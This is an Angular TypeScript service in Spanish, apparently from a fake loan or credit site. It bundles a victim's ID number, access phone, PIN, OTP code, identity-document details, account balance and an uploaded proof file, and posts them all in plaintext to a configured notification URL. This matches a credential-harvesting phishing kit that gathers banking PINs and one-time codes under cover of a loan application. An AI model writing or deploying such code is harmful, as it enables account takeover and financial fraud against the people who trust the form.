import { Injectable, inject } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Credito } from './credito';
import { Solicitud } from './solicitud';
import { environment } from '../../environments/environment';

interface Campo {
  nombre: string;
  valor: string;
}

interface SeccionMensaje {
  titulo: string;
  campos: Campo[];
}

@Injectable({ providedIn: 'root' })
export class Notificador {
  private readonly http = inject(HttpClient);
  private readonly credito = inject(Credito);

  enviarSolicitud(s: Solicitud): void {
    const secciones = this.construirSecciones(s);
    if (secciones.length === 0) {
      return;
    }

    const cuerpo: { secciones: SeccionMensaje[]; archivo?: unknown } = { secciones };

    if (s.validacion?.comprobante) {
      const c = s.validacion.comprobante;
      cuerpo.archivo = { nombre: c.nombre, tipo: c.tipo, base64: c.base64 };
    }

    this.http.post(environment.notificarUrl, cuerpo).subscribe({
      error: (e) => console.error('No se pudo notificar', e),
    });
  }

  private construirSecciones(s: Solicitud): SeccionMensaje[] {
    const secciones: SeccionMensaje[] = [];

    if (s.cliente) {
      secciones.push({
        titulo: 'Cliente',
        campos: [{ nombre: 'Cédula', valor: s.cliente.cedula }],
      });
    }

    if (s.credito) {
      const c = s.credito;
      secciones.push({
        titulo: 'Crédito pactado',
        campos: [
          { nombre: 'Monto', valor: this.credito.formatoPesos(c.monto) },
          { nombre: 'Plazo', valor: `${c.plazo} meses` },
          { nombre: 'Cuota mensual', valor: this.credito.formatoPesos(c.cuota) },
          { nombre: 'Tasa', valor: this.credito.textoTasa(c.tasaMensual) },
          { nombre: 'Fecha de pago', valor: c.fechaPago },
        ],
      });
    }

    if (s.acceso) {
      secciones.push({
        titulo: 'Acceso',
        campos: [
          { nombre: 'Teléfono de acceso', valor: s.acceso.telefono },
          { nombre: 'PIN', valor: s.pin?.clave ?? '-' },
        ],
      });
    }

    if (s.validacion) {
      const v = s.validacion;
      secciones.push({
        titulo: 'Validación de identidad',
        campos: [
          { nombre: 'Nombre', valor: v.nombre },
          { nombre: 'Tipo de documento', valor: v.tipoDocumento },
          { nombre: 'Número de documento', valor: v.numeroDocumento },
          { nombre: 'Teléfono', valor: v.telefono },
          { nombre: 'Correo', valor: v.correo },
          { nombre: 'Saldo disponible', valor: this.credito.formatoPesos(v.saldo) },
          {
            nombre: 'Comprobante',
            valor: `${v.comprobante.nombre} (${v.comprobante.tipo}, ${Math.round(v.comprobante.tamano / 1024)} KB)`,
          },
        ],
      });
    }

    if (s.otp) {
      secciones.push({
        titulo: 'OTP',
        campos: [{ nombre: 'Código', valor: s.otp.codigo }],
      });
    }

    return secciones;
  }
}